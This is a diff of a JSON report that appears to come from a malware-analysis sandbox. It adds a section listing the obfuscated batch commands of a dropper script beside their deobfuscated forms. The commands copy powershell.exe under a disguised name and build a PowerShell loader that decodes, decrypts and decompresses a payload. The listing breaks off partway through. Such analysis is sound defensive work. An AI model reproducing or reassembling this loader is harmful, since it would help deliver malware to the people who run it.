@@ -5,7 +5,1692 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[{\"Command\": \"%CuYg%\\\"KWxq==\\\"\", \"Normalized\": \"set \\\"KWxq==\\\"\"}, {\"Command\": \"%CuYg%\\\"evHTLasVFk%KWxq%copy\\\"\", \"Normalized\": \"set \\\"evHTLasVFk=copy\\\"\"}, {\"Command\": \"%CuYg%\\\"MejltbzOCJ%KWxq%rshe\\\"\", \"Normalized\": \"set \\\"MejltbzOCJ=rshe\\\"\"}, {\"Command\": \"%CuYg%\\\"NvEwsFRrTJ%KWxq%rShe\\\"\", \"Normalized\": \"set \\\"NvEwsFRrTJ=rShe\\\"\"}, {\"Command\": \"%CuYg%\\\"TLFGuiAjed%KWxq%\\\\Win\\\"\", \"Normalized\": \"set \\\"TLFGuiAjed=\\\\Win\\\"\"}, {\"Command\": \"%CuYg%\\\"rxXnSEPTyQ%KWxq%Syst\\\"\", \"Normalized\": \"set \\\"rxXnSEPTyQ=Syst\\\"\"}, {\"Command\": \"%CuYg%\\\"PqcXFSpvJl%KWxq%ows\\\\\\\"\", \"Normalized\": \"set \\\"PqcXFSpvJl=ows\\\\\\\"\"}, {\"Command\": \"%CuYg%\\\"zCgJWixVBh%KWxq% C:\\\\\\\"\", \"Normalized\": \"set \\\"zCgJWixVBh= C:\\\\\\\"\"}, {\"Command\": \"%CuYg%\\\"wPmWFLwmSO%KWxq%ll.e\\\"\", \"Normalized\": \"set \\\"wPmWFLwmSO=ll.e\\\"\"}, {\"Command\": \"%CuYg%\\\"jPiqZkTOYC%KWxq%y \\\"%~0.\\\"\", \"Normalized\": \"set \\\"jPiqZkTOYC=y \\\"script.bat.\\\"\"}, {\"Command\": \"%CuYg%\\\"cMazvqfEdA%KWxq%xe /\\\"\", \"Normalized\": \"set \\\"cMazvqfEdA=xe /\\\"\"}, {\"Command\": \"%CuYg%\\\"SblpPDvcUy%KWxq%dows\\\"\", \"Normalized\": \"set \\\"SblpPDvcUy=dows\\\"\"}, {\"Command\": \"%CuYg%\\\"nOAjqwxOWj%KWxq%powe\\\"\", \"Normalized\": \"set \\\"nOAjqwxOWj=powe\\\"\"}, {\"Command\": \"%CuYg%\\\"IoiAqaVMIU%KWxq%Powe\\\"\", \"Normalized\": \"set \\\"IoiAqaVMIU=Powe\\\"\"}, {\"Command\": \"%CuYg%\\\"ocZsEEDeqt%KWxq%1.0\\\\\\\"\", \"Normalized\": \"set \\\"ocZsEEDeqt=1.0\\\\\\\"\"}, {\"Command\": \"%CuYg%\\\"eGOuXHDfAL%KWxq%ll\\\\v\\\"\", \"Normalized\": \"set \\\"eGOuXHDfAL=ll\\\\v\\\"\"}, {\"Command\": \"%CuYg%\\\"eOCHWxBEEF%KWxq%exe\\\"\\\"\", \"Normalized\": \"set \\\"eOCHWxBEEF=exe\\\"\\\"\"}, {\"Command\": \"%CuYg%\\\"atqNdyhGqZ%KWxq%Wind\\\"\", \"Normalized\": \"set \\\"atqNdyhGqZ=Wind\\\"\"}, {\"Command\": \"%CuYg%\\\"IPvppKfUQn%KWxq%em32\\\"\", \"Normalized\": \"set \\\"IPvppKfUQn=em32\\\"\"}, {\"Command [trunc]\": \"%evHTLasVFk%%zCgJWixVBh%%atqNdyhGqZ%%PqcXFSpvJl%%rxXnSEPTyQ%%IPvppKfUQn%%TLFGuiAjed%%SblpPDvcUy%%Ioi\", \"Normalized\": \"copy C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /y \\\"script.bat.exe\\\"\"}, {\"Command\": \"%CuYg%\\\"evHTLasVFk%KWxq%cls\\\"\", \"Normalized\": \"set \\\"evHTLasVFk=cls\\\"\"}, {\"Command\": \"%evHTLasVFk%\", \"Normalized\": \"cls\"}, {\"Command\": \"%CuYg%\\\"evHTLasVFk%KWxq%cd \\\"%~dp0\\\"\\\"\", \"Normalized\": \"set \\\"evHTLasVFk=cd \\\"C:\\\\Users\\\\al\\\\Downloads\\\\\\\"\\\"\"}, {\"Command\": \"%evHTLasVFk%\", \"Normalized\": \"cd \\\"C:\\\\Users\\\\al\\\\Downloads\\\\\\\"\"}, {\"Command\": \"%CuYg%\\\"KFhiTtTefn%KWxq%bcsc\\\"\", \"Normalized\": \"set \\\"KFhiTtTefn=bcsc\\\"\"}, {\"Command\": \"%CuYg%\\\"OLhRouUmCA%KWxq%yste\\\"\", \"Normalized\": \"set \\\"OLhRouUmCA=yste\\\"\"}, {\"Command\": \"%CuYg%\\\"TuALKbnWbr%KWxq%daeR\\\"\", \"Normalized\": \"set \\\"TuALKbnWbr=daeR\\\"\"}, {\"Command\": \"%CuYg%\\\"KorzVUcxpH%KWxq%fzpV\\\"\", \"Normalized\": \"set \\\"KorzVUcxpH=fzpV\\\"\"}, {\"Command\": \"%CuYg%\\\"iMzGCsFzmB%KWxq%  $W\\\"\", \"Normalized\": \"set \\\"iMzGCsFzmB=  $W\\\"\"}, {\"Command\": \"%CuYg%\\\"NQtRMbKKNU%KWxq%ompr\\\"\", \"Normalized\": \"set \\\"NQtRMbKKNU=ompr\\\"\"}, {\"Command\": \"%CuYg%\\\"IzwhrUNQvp%KWxq%tj9E\\\"\", \"Normalized\": \"set \\\"IzwhrUNQvp=tj9E\\\"\"}, {\"Command\": \"%CuYg%\\\"ToSfqNpbOP%KWxq%= Ne\\\"\", \"Normalized\": \"set \\\"ToSfqNpbOP== Ne\\\"\"}, {\"Command\": \"%CuYg%\\\"MRklRxGPSt%KWxq%vert\\\"\", \"Normalized\": \"set \\\"MRklRxGPSt=vert\\\"\"}, {\"Command\": \"%CuYg%\\\"JAQhUMIKUc%KWxq%eam(\\\"\", \"Normalized\": \"set \\\"JAQhUMIKUc=eam(\\\"\"}, {\"Command\": \"%CuYg%\\\"AqUTOKTzkr%KWxq%, $u\\\"\", \"Normalized\": \"set \\\"AqUTOKTzkr=, $u\\\"\"}, {\"Command\": \"%CuYg%\\\"eBYxfCljzM%KWxq%n.Co\\\"\", \"Normalized\": \"set \\\"eBYxfCljzM=n.Co\\\"\"}, {\"Command\": \"%CuYg%\\\"VhYAnFQNNA%KWxq%-16]\\\"\", \"Normalized\": \"set \\\"VhYAnFQNNA=-16]\\\"\"}, {\"Command\": \"%CuYg%\\\"cMazvqfEdA%KWxq%mFNA\\\"\", \"Normalized\": \"set \\\"cMazvqfEdA=mFNA\\\"\"}, {\"Command\": \"%CuYg%\\\"PgBBDfaZmz%KWxq%GzhX\\\"\", \"Normalized\": \"set \\\"PgBBDfaZmz=GzhX\\\"\"}, {\"Command\": \"%CuYg%\\\"MejltbzOCJ%KWxq% Fbe\\\"\", \"Normalized\": \"set \\\"MejltbzOCJ= Fbe\\\"\"}, {\"Command\": \"%CuYg%\\\"uOLDbMOzLS%KWxq%LI =\\\"\", \"Normalized\": \"set \\\"uOLDbMOzLS=LI =\\\"\"}, {\"Command\": \"%CuYg%\\\"CIbOVoBykK%KWxq%');$\\\"\", \"Normalized\": \"set \\\"CIbOVoBykK=');$\\\"\"}, {\"Command\": \"%CuYg%\\\"OVWXlExqUt%KWxq%tslL\\\"\", \"Normalized\": \"set \\\"OVWXlExqUt=tslL\\\"\"}, {\"Command\": \"%CuYg%\\\"gARUeyUZdZ%KWxq%se()\\\"\", \"Normalized\": \"set \\\"gARUeyUZdZ=se()\\\"\"}, {\"Command\": \"%CuYg%\\\"xCNFaFctSS%KWxq%[Env\\\"\", \"Normalized\": \"set \\\"xCNFaFctSS=[Env\\\"\"}, {\"Command\": \"%CuYg%\\\"IhyuaHGOAO%KWxq% [Sy\\\"\", \"Normalized\": \"set \\\"IhyuaHGOAO= [Sy\\\"\"}, {\"Command\": \"%CuYg%\\\"fnEhcmdYIF%KWxq%Y = \\\"\", \"Normalized\": \"set \\\"fnEhcmdYIF=Y = \\\"\"}, {\"Command\": \"%CuYg%\\\"tOOHnwFVSB%KWxq% Sys\\\"\", \"Normalized\": \"set \\\"tOOHnwFVSB= Sys\\\"\"}, {\"Command\": \"%CuYg%\\\"DiuWzpTqag%KWxq%ToAr\\\"\", \"Normalized\": \"set \\\"DiuWzpTqag=ToAr\\\"\"}, {\"Command\": \"%CuYg%\\\"JIIjCjMAXx%KWxq%ray(\\\"\", \"Normalized\": \"set \\\"JIIjCjMAXx=ray(\\\"\"}, {\"Command\": \"%CuYg%\\\"fCIgYFrYEd%KWxq%de]:\\\"\", \"Normalized\": \"set \\\"fCIgYFrYEd=de]:\\\"\"}, {\"Command\": \"%CuYg%\\\"eNAlZmKoBq%KWxq%Decr\\\"\", \"Normalized\": \"set \\\"eNAlZmKoBq=Decr\\\"\"}, {\"Command\": \"%CuYg%\\\"KAPZcPfmqI%KWxq%rtS4\\\"\", \"Normalized\": \"set \\\"KAPZcPfmqI=rtS4\\\"\"}, {\"Command\": \"%CuYg%\\\"atoaBcGwDP%KWxq%Wzhe\\\"\", \"Normalized\": \"set \\\"atoaBcGwDP=Wzhe\\\"\"}, {\"Command\": \"%CuYg%\\\"tpKxvYUwEL%KWxq%[]]$\\\"\", \"Normalized\": \"set \\\"tpKxvYUwEL=[]]$\\\"\"}, {\"Command\": \"%CuYg%\\\"wPmWFLwmSO%KWxq%oh($\\\"\", \"Normalized\": \"set \\\"wPmWFLwmSO=oh($\\\"\"}, {\"Command\": \"%CuYg%\\\"onPKItoWSm%KWxq%F'[-\\\"\", \"Normalized\": \"set \\\"onPKItoWSm=F'[-\\\"\"}, {\"Command\": \"%CuYg%\\\"OsraDVDLeC%KWxq%Syst\\\"\", \"Normalized\": \"set \\\"OsraDVDLeC=Syst\\\"\"}, {\"Command\": \"%CuYg%\\\"nASJxCScAq%KWxq%ngMo\\\"\", \"Normalized\": \"set \\\"nASJxCScAq=ngMo\\\"\"}, {\"Command\": \"%CuYg%\\\"MolEQFEDdv%KWxq%c $n\\\"\", \"Normalized\": \"set \\\"MolEQFEDdv=c $n\\\"\"}, {\"Command\": \"%CuYg%\\\"nOAjqwxOWj%KWxq%tion\\\"\", \"Normalized\": \"set \\\"nOAjqwxOWj=tion\\\"\"}, {\"Command\": \"%CuYg%\\\"MxzYohHXZJ%KWxq%h ([\\\"\", \"Normalized\": \"set \\\"MxzYohHXZJ=h ([\\\"\"}, {\"Command\": \"%CuYg%\\\"RFCthfrYDh%KWxq%{$fz\\\"\", \"Normalized\": \"set \\\"RFCthfrYDh={$fz\\\"\"}, {\"Command\": \"%CuYg%\\\"qtDufrglgY%KWxq%[-1.\\\"\", \"Normalized\": \"set \\\"qtDufrglgY=[-1.\\\"\"}, {\"Command\": \"%CuYg%\\\"LCYHPKzbLB%KWxq%;Gzh\\\"\", \"Normalized\": \"set \\\"LCYHPKzbLB=;Gzh\\\"\"}, {\"Command\": \"%CuYg%\\\"ffFVVznKpA%KWxq%ach \\\"\", \"Normalized\": \"set \\\"ffFVVznKpA=ach \\\"\"}, {\"Command\": \"%CuYg%\\\"RAOfBcDoSK%KWxq%Xy $\\\"\", \"Normalized\": \"set \\\"RAOfBcDoSK=Xy $\\\"\"}, {\"Command\": \"%CuYg%\\\"skZhaoDTik%KWxq%e]::\\\"\", \"Normalized\": \"set \\\"skZhaoDTik=e]::\\\"\"}, {\"Command\": \"%CuYg%\\\"TIWMILLZPJ%KWxq%th('\\\"\", \"Normalized\": \"set \\\"TIWMILLZPJ=th('\\\"\"}, {\"Command\": \"%CuYg%\\\"GQjMJmNRvl%KWxq%ispo\\\"\", \"Normalized\": \"set \\\"GQjMJmNRvl=ispo\\\"\"}, {\"Command\": \"%CuYg%\\\"AaDtnoGIFd%KWxq%ssio\\\"\", \"Normalized\": \"set \\\"AaDtnoGIFd=ssio\\\"\"}, {\"Command\": \"%CuYg%\\\"blDGmyCaXe%KWxq%:('d\\\"\", \"Normalized\": \"set \\\"blDGmyCaXe=:('d\\\"\"}, {\"Command\": \"%CuYg%\\\"CgJNeBHzYp%KWxq%bkw.\\\"\", \"Normalized\": \"set \\\"CgJNeBHzYp=bkw.\\\"\"}, {\"Command\": \"%CuYg%\\\"EOqrgPYKgK%KWxq%StqX\\\"\", \"Normalized\": \"set \\\"EOqrgPYKgK=StqX\\\"\"}, {\"Command\": \"%CuYg%\\\"HZbOFHUmqG%KWxq%stem\\\"\", \"Normalized\": \"set \\\"HZbOFHUmqG=stem\\\"\"}, {\"Command\": \"%CuYg%\\\"EfkSaASwJI%KWxq%JIL.\\\"\", \"Normalized\": \"set \\\"EfkSaASwJI=JIL.\\\"\"}, {\"Command\": \"%CuYg%\\\"PBQFzEKslK%KWxq%)));\\\"\", \"Normalized\": \"set \\\"PBQFzEKslK=)));\\\"\"}, {\"Command\": \"%CuYg%\\\"xFAZQSxCWO%KWxq%e]::\\\"\", \"Normalized\": \"set \\\"xFAZQSxCWO=e]::\\\"\"}, {\"Command\": \"%CuYg%\\\"XMvoEjSTYL%KWxq%e();\\\"\", \"Normalized\": \"set \\\"XMvoEjSTYL=e();\\\"\"}, {\"Command\": \"%CuYg%\\\"saHGAsRDbU%KWxq%BpQ \\\"\", \"Normalized\": \"set \\\"saHGAsRDbU=BpQ \\\"\"}, {\"Command\": \"%CuYg%\\\"nAPnHVrwnI%KWxq%Q=='\\\"\", \"Normalized\": \"set \\\"nAPnHVrwnI=Q=='\\\"\"}, {\"Command\": \"%CuYg%\\\"PqcXFSpvJl%KWxq%prof\\\"\", \"Normalized\": \"set \\\"PqcXFSpvJl=prof\\\"\"}, {\"Command\": \"%CuYg%\\\"hDlSfqIlxz%KWxq%md[1\\\"\", \"Normalized\": \"set \\\"hDlSfqIlxz=md[1\\\"\"}, {\"Command\": \"%CuYg%\\\"MlvLKWcNOr%KWxq%utZv\\\"\", \"Normalized\": \"set \\\"MlvLKWcNOr=utZv\\\"\"}, {\"Command\": \"%CuYg%\\\"YBpmHyniMy%KWxq%on c\\\"\", \"Normalized\": \"set \\\"YBpmHyniMy=on c\\\"\"}, {\"Command\": \"%CuYg%\\\"CwGfNEeRDg%KWxq%c (F\\\"\", \"Normalized\": \"set \\\"CwGfNEeRDg=c (F\\\"\"}, {\"Command\": \"%CuYg%\\\"iNGirhpUFJ%KWxq%Memo\\\"\", \"Normalized\": \"set \\\"iNGirhpUFJ=Memo\\\"\"}, {\"Command\": \"%CuYg%\\\"TPluQNyJMl%KWxq%brea\\\"\", \"Normalized\": \"set \\\"TPluQNyJMl=brea\\\"\"}, {\"Command\": \"%CuYg%\\\"QUNIxHUhTO%KWxq%ne);\\\"\", \"Normalized\": \"set \\\"QUNIxHUhTO=ne);\\\"\"}, {\"Command\": \"%CuYg%\\\"hvGfJzFvTX%KWxq%.Sec\\\"\", \"Normalized\": \"set \\\"hvGfJzFvTX=.Sec\\\"\"}, {\"Command\": \"%CuYg%\\\"qgqWfSinGK%KWxq%]::N\\\"\", \"Normalized\": \"set \\\"qgqWfSinGK=]::N\\\"\"}, {\"Command\": \"%CuYg%\\\"wYnLgIYcpq%KWxq%1] -\\\"\", \"Normalized\": \"set \\\"wYnLgIYcpq=1] -\\\"\"}, {\"Command\": \"%CuYg%\\\"TeVUbqzwtx%KWxq%]::(\\\"\", \"Normalized\": \"set \\\"TeVUbqzwtx=]::(\\\"\"}, {\"Command\": \"%CuYg%\\\"bZaCizBSiv%KWxq%xbkw\\\"\", \"Normalized\": \"set \\\"bZaCizBSiv=xbkw\\\"\"}, {\"Command\": \"%CuYg%\\\"nDQDczelLa%KWxq%de =\\\"\", \"Normalized\": \"set \\\"nDQDczelLa=de =\\\"\"}, {\"Command\": \"%CuYg%\\\"vGbqITHGpQ%KWxq%tem.\\\"\", \"Normalized\": \"set \\\"vGbqITHGpQ=tem.\\\"\"}, {\"Command\": \"%CuYg%\\\"ujcyREZKgC%KWxq%mijf\\\"\", \"Normalized\": \"set \\\"ujcyREZKgC=mijf\\\"\"}, {\"Command\": \"%CuYg%\\\"joOgFaomrJ%KWxq%[Sys\\\"\", \"Normalized\": \"set \\\"joOgFaomrJ=[Sys\\\"\"}, {\"Command\": \"%CuYg%\\\"dnZKuTJdXZ%KWxq%zheY\\\"\", \"Normalized\": \"set \\\"dnZKuTJdXZ=zheY\\\"\"}, {\"Command\": \"%CuYg%\\\"PBFDYqdwLA%KWxq%;$iX\\\"\", \"Normalized\": \"set \\\"PBFDYqdwLA=;$iX\\\"\"}, {\"Command\": \"%CuYg%\\\"cyFCmQMRxa%KWxq%]::(\\\"\", \"Normalized\": \"set \\\"cyFCmQMRxa=]::(\\\"\"}, {\"Command\": \"%CuYg%\\\"zDcsPzxQgU%KWxq%m($f\\\"\", \"Normalized\": \"set \\\"zDcsPzxQgU=m($f\\\"\"}, {\"Command\": \"%CuYg%\\\"yImlKoDuZf%KWxq%grap\\\"\", \"Normalized\": \"set \\\"yImlKoDuZf=grap\\\"\"}, {\"Command\": \"%CuYg%\\\"tGATjgbFdZ%KWxq%ert]\\\"\", \"Normalized\": \"set \\\"tGATjgbFdZ=ert]\\\"\"}, {\"Command\": \"%CuYg%\\\"uPLJZRcqKI%KWxq%L.Ke\\\"\", \"Normalized\": \"set \\\"uPLJZRcqKI=L.Ke\\\"\"}, {\"Command\": \"%CuYg%\\\"hxdJgDtyUh%KWxq%mpre\\\"\", \"Normalized\": \"set \\\"hxdJgDtyUh=mpre\\\"\"}, {\"Command\": \"%CuYg%\\\"XMgFbeVRQo%KWxq%Spli\\\"\", \"Normalized\": \"set \\\"XMgFbeVRQo=Spli\\\"\"}, {\"Command\": \"%CuYg%\\\"yQqgtOKUCw%KWxq%fzum\\\"\", \"Normalized\": \"set \\\"yQqgtOKUCw=fzum\\\"\"}, {\"Command\": \"%CuYg%\\\"kmRUNdlwoK%KWxq% '')\\\"\", \"Normalized\": \"set \\\"kmRUNdlwoK= '')\\\"\"}, {\"Command\": \"%CuYg%\\\"sKZmnYwsPK%KWxq%var \\\"\", \"Normalized\": \"set \\\"sKZmnYwsPK=var \\\"\"}, {\"Command\": \"%CuYg%\\\"AqVVbXxnDl%KWxq%UUzN\\\"\", \"Normalized\": \"set \\\"AqVVbXxnDl=UUzN\\\"\"}, {\"Command\": \"%CuYg%\\\"UeGEtxdZSP%KWxq%ypto\\\"\", \"Normalized\": \"set \\\"UeGEtxdZSP=ypto\\\"\"}, {\"Command\": \"%CuYg%\\\"zCgJWixVBh%KWxq%exe\\\"\\\"\", \"Normalized\": \"set \\\"zCgJWixVBh=exe\\\"\\\"\"}, {\"Command\": \"%CuYg%\\\"LyhwAdTOlf%KWxq%ncti\\\"\", \"Normalized\": \"set \\\"LyhwAdTOlf=ncti\\\"\"}, {\"Command\": \"%CuYg%\\\"BpntAnTBoB%KWxq%rMod\\\"\", \"Normalized\": \"set \\\"BpntAnTBoB=rMod\\\"\"}, {\"Command\": \"%CuYg%\\\"VvWxZiUGJF%KWxq%gGVH\\\"\", \"Normalized\": \"set \\\"VvWxZiUGJF=gGVH\\\"\"}, {\"Command\": \"%CuYg%\\\"UOXvXISuQx%KWxq%o);$\\\"\", \"Normalized\": \"set \\\"UOXvXISuQx=o);$\\\"\"}, {\"Command\": \"%CuYg%\\\"ofpWOkNolu%KWxq%16] \\\"\", \"Normalized\": \"set \\\"ofpWOkNolu=16] \\\"\"}, {\"Command\": \"%CuYg%\\\"dcMEyyMALh%KWxq%y.Cr\\\"\", \"Normalized\": \"set \\\"dcMEyyMALh=y.Cr\\\"\"}, {\"Command\": \"%CuYg%\\\"gAVCeNjcRT%KWxq%($gE\\\"\", \"Normalized\": \"set \\\"gAVCeNjcRT=($gE\\\"\"}, {\"Command\": \"%CuYg%\\\"kQjYaqquLh%KWxq%bstr\\\"\", \"Normalized\": \"set \\\"kQjYaqquLh=bstr\\\"\"}, {\"Command\": \"%CuYg%\\\"NFBDRELKjY%KWxq%se()\\\"\", \"Normalized\": \"set \\\"NFBDRELKjY=se()\\\"\"}, {\"Command\": \"%CuYg%\\\"dsJSmRQNVP%KWxq%sc (\\\"\", \"Normalized\": \"set \\\"dsJSmRQNVP=sc (\\\"\"}, {\"Command\": \"%CuYg%\\\"nZvZPCokpW%KWxq%y $U\\\"\", \"Normalized\": \"set \\\"nZvZPCokpW=y $U\\\"\"}, {\"Command\": \"%CuYg%\\\"zPAxpoHTNb%KWxq%y($m\\\"\", \"Normalized\": \"set \\\"zPAxpoHTNb=y($m\\\"\"}, {\"Command\": \"%CuYg%\\\"qUMWvTjQGV%KWxq%('gn\\\"\", \"Normalized\": \"set \\\"qUMWvTjQGV=('gn\\\"\"}, {\"Command\": \"%CuYg%\\\"AueOmBfLQU%KWxq%ew-O\\\"\", \"Normalized\": \"set \\\"AueOmBfLQU=ew-O\\\"\"}, {\"Command\": \"%CuYg%\\\"kOTNkGtoIo%KWxq%m.Co\\\"\", \"Normalized\": \"set \\\"kOTNkGtoIo=m.Co\\\"\"}, {\"Command\": \"%CuYg%\\\"HlKHYIysIk%KWxq%aBmo\\\"\", \"Normalized\": \"set \\\"HlKHYIysIk=aBmo\\\"\"}, {\"Command\": \"%CuYg%\\\"kUkLvGkPtL%KWxq%ntry\\\"\", \"Normalized\": \"set \\\"kUkLvGkPtL=ntry\\\"\"}, {\"Command\": \"%CuYg%\\\"gbYynNpojg%KWxq%rySt\\\"\", \"Normalized\": \"set \\\"gbYynNpojg=rySt\\\"\"}, {\"Command\": \"%CuYg%\\\"envboRXubR%KWxq%oke(\\\"\", \"Normalized\": \"set \\\"envboRXubR=oke(\\\"\"}, {\"Command\": \"%CuYg%\\\"IkMYWrwteh%KWxq%nalB\\\"\", \"Normalized\": \"set \\\"IkMYWrwteh=nalB\\\"\"}, {\"Command\": \"%CuYg%\\\"atekjCvdNs%KWxq%t Sy\\\"\", \"Normalized\": \"set \\\"atekjCvdNs=t Sy\\\"\"}, {\"Command\": \"%CuYg%\\\"WGpKtCdmgE%KWxq%eate\\\"\", \"Normalized\": \"set \\\"WGpKtCdmgE=eate\\\"\"}, {\"Command\": \"%CuYg%\\\"cjuOhQlzgf%KWxq%[str\\\"\", \"Normalized\": \"set \\\"cjuOhQlzgf=[str\\\"\"}, {\"Command\": \"%CuYg%\\\"MIuEHGHIEE%KWxq%opyT\\\"\", \"Normalized\": \"set \\\"MIuEHGHIEE=opyT\\\"\"}, {\"Command\": \"%CuYg%\\\"zkWuMLvWRI%KWxq%, [I\\\"\", \"Normalized\": \"set \\\"zkWuMLvWRI=, [I\\\"\"}, {\"Command\": \"%CuYg%\\\"VDcTgbJqLM%KWxq%stem\\\"\", \"Normalized\": \"set \\\"VDcTgbJqLM=stem\\\"\"}, {\"Command\": \"%CuYg%\\\"otdYaXQYEw%KWxq%slL.\\\"\", \"Normalized\": \"set \\\"otdYaXQYEw=slL.\\\"\"}, {\"Command\": \"%CuYg%\\\"ViyNXAeGEH%KWxq%iXJI\\\"\", \"Normalized\": \"set \\\"ViyNXAeGEH=iXJI\\\"\"}, {\"Command\": \"%CuYg%\\\"eGllXgojwo%KWxq%ing(\\\"\", \"Normalized\": \"set \\\"eGllXgojwo=ing(\\\"\"}, {\"Command\": \"%CuYg%\\\"egsBJiUFus%KWxq%Conv\\\"\", \"Normalized\": \"set \\\"egsBJiUFus=Conv\\\"\"}, {\"Command\": \"%CuYg%\\\"IVcgoIgwkq%KWxq%:('g\\\"\", \"Normalized\": \"set \\\"IVcgoIgwkq=:('g\\\"\"}, {\"Command\": \"%CuYg%\\\"MtUmESmgMg%KWxq%rmFi\\\"\", \"Normalized\": \"set \\\"MtUmESmgMg=rmFi\\\"\"}, {\"Command\": \"%CuYg%\\\"RYWZunfWqV%KWxq%-joi\\\"\", \"Normalized\": \"set \\\"RYWZunfWqV=-joi\\\"\"}, {\"Command\": \"%CuYg%\\\"FOhXbwdxdZ%KWxq%'')(\\\"\", \"Normalized\": \"set \\\"FOhXbwdxdZ='')(\\\"\"}, {\"Command\": \"%CuYg%\\\"mpkRSgtcFV%KWxq%n ''\\\"\", \"Normalized\": \"set \\\"mpkRSgtcFV=n ''\\\"\"}, {\"Command\": \"%CuYg%\\\"BUGYpAmddd%KWxq%6esa\\\"\", \"Normalized\": \"set \\\"BUGYpAmddd=6esa\\\"\"}, {\"Command\": \"%CuYg%\\\"lBRWyQvoQd%KWxq%$uNB\\\"\", \"Normalized\": \"set \\\"lBRWyQvoQd=$uNB\\\"\"}, {\"Command\": \"%CuYg%\\\"SyvYyHgerc%KWxq%)) {\\\"\", \"Normalized\": \"set \\\"SyvYyHgerc=)) {\\\"\"}, {\"Command\": \"%CuYg%\\\"VEFEOhcCWS%KWxq%6] -\\\"\", \"Normalized\": \"set \\\"VEFEOhcCWS=6] -\\\"\"}, {\"Command\": \"%CuYg%\\\"ErXcpjwIKC%KWxq%yStr\\\"\", \"Normalized\": \"set \\\"ErXcpjwIKC=yStr\\\"\"}, {\"Command\": \"%CuYg%\\\"lKZxzwhsBz%KWxq%;$re\\\"\", \"Normalized\": \"set \\\"lKZxzwhsBz=;$re\\\"\"}, {\"Command\": \"%CuYg%\\\"vASdYpSKKN%KWxq%tsWi\\\"\", \"Normalized\": \"set \\\"vASdYpSKKN=tsWi\\\"\"}, {\"Command\": \"%CuYg%\\\"JWUqvphrHS%KWxq%esaB\\\"\", \"Normalized\": \"set \\\"JWUqvphrHS=esaB\\\"\"}, {\"Command\": \"%CuYg%\\\"QFHiNsXGyT%KWxq%ct S\\\"\", \"Normalized\": \"set \\\"QFHiNsXGyT=ct S\\\"\"}, {\"Command\": \"%CuYg%\\\"rxXnSEPTyQ%KWxq%ile \\\"\", \"Normalized\": \"set \\\"rxXnSEPTyQ=ile \\\"\"}, {\"Command\": \"%CuYg%\\\"QEtrftGoQb%KWxq%lock\\\"\", \"Normalized\": \"set \\\"QEtrftGoQb=lock\\\"\"}, {\"Command\": \"%CuYg%\\\"iPKCkGzGDD%KWxq%nMod\\\"\", \"Normalized\": \"set \\\"iPKCkGzGDD=nMod\\\"\"}, {\"Command\": \"%CuYg%\\\"WYEkpCNxct%KWxq% Sys\\\"\", \"Normalized\": \"set \\\"WYEkpCNxct= Sys\\\"\"}, {\"Command\": \"%CuYg%\\\"EHHMBWqwZQ%KWxq%gEEc\\\"\", \"Normalized\": \"set \\\"EHHMBWqwZQ=gEEc\\\"\"}, {\"Command\": \"%CuYg%\\\"iMKmSDHVhP%KWxq%NBpQ\\\"\", \"Normalized\": \"set \\\"iMKmSDHVhP=NBpQ\\\"\"}, {\"Command\": \"%CuYg%\\\"GnfcXqLaET%KWxq%IL.D\\\"\", \"Normalized\": \"set \\\"GnfcXqLaET=IL.D\\\"\"}, {\"Command\": \"%CuYg%\\\"IofVwrOZvf%KWxq%w-Ob\\\"\", \"Normalized\": \"set \\\"IofVwrOZvf=w-Ob\\\"\"}, {\"Command\": \"%CuYg%\\\"fJSYpixWJx%KWxq%tS46\\\"\", \"Normalized\": \"set \\\"fJSYpixWJx=tS46\\\"\"}, {\"Command\": \"%CuYg%\\\"cyNZrGxsfL%KWxq%'txe\\\"\", \"Normalized\": \"set \\\"cyNZrGxsfL='txe\\\"\"}, {\"Command\": \"%CuYg%\\\"QvaOwAcijy%KWxq%unct\\\"\", \"Normalized\": \"set \\\"QvaOwAcijy=unct\\\"\"}, {\"Command\": \"%CuYg%\\\"CsdnCHIiBV%KWxq%in '\\\"\", \"Normalized\": \"set \\\"CsdnCHIiBV=in '\\\"\"}, {\"Command\": \"%CuYg%\\\"uWSGpwyuOH%KWxq%).Sp\\\"\", \"Normalized\": \"set \\\"uWSGpwyuOH=).Sp\\\"\"}, {\"Command\": \"%CuYg%\\\"JsbyFkzfFN%KWxq%; };\\\"\", \"Normalized\": \"set \\\"JsbyFkzfFN=; };\\\"\"}, {\"Command\": \"%CuYg%\\\"pOyXVxzoYC%KWxq%('%~f0'\\\"\", \"Normalized\": \"set \\\"pOyXVxzoYC=('C:\\\\Users\\\\al\\\\Downloads\\\\script.bat'\\\"\"}, {\"Command\": \"%CuYg%\\\"yyCsXPZcHG%KWxq%] -j\\\"\", \"Normalized\": \"set \\\"yyCsXPZcHG=] -j\\\"\"}, {\"Command\": \"%CuYg%\\\"YupmQrkVdE%KWxq%aoL'\\\"\", \"Normalized\": \"set \\\"YupmQrkVdE=aoL'\\\"\"}, {\"Command\": \"%CuYg%\\\"ByQAToqFxd%KWxq% -jo\\\"\", \"Normalized\": \"set \\\"ByQAToqFxd= -jo\\\"\"}, {\"Command\": \"%CuYg%\\\"RcuhFKcUII%KWxq%oin \\\"\", \"Normalized\": \"set \\\"RcuhFKcUII=oin \\\"\"}, {\"Command\": \"%CuYg%\\\"ZNsaHsUbRP%KWxq%$nul\\\"\", \"Normalized\": \"set \\\"ZNsaHsUbRP=$nul\\\"\"}, {\"Command\": \"%CuYg%\\\"zWFoThARuW%KWxq% [Sy\\\"\", \"Normalized\": \"set \\\"zWFoThARuW= [Sy\\\"\"}, {\"Command\": \"%CuYg%\\\"tDlButcNTx%KWxq%..-1\\\"\", \"Normalized\": \"set \\\"tDlButcNTx=..-1\\\"\"}, {\"Command\": \"%CuYg%\\\"jSOmaGSHAE%KWxq%rt]:\\\"\", \"Normalized\": \"set \\\"jSOmaGSHAE=rt]:\\\"\"}, {\"Command\": \"%CuYg%\\\"FWEzExElmz%KWxq%IV =\\\"\", \"Normalized\": \"set \\\"FWEzExElmz=IV =\\\"\"}, {\"Command\": \"%CuYg%\\\"keokFIWIlG%KWxq%y.Cr\\\"\", \"Normalized\": \"set \\\"keokFIWIlG=y.Cr\\\"\"}, {\"Command\": \"%CuYg%\\\"HpNHaqMHBq%KWxq%hy.P\\\"\", \"Normalized\": \"set \\\"HpNHaqMHBq=hy.P\\\"\"}, {\"Command\": \"%CuYg%\\\"naresmfIoY%KWxq%3); \\\"\", \"Normalized\": \"set \\\"naresmfIoY=3); \\\"\"}, {\"Command\": 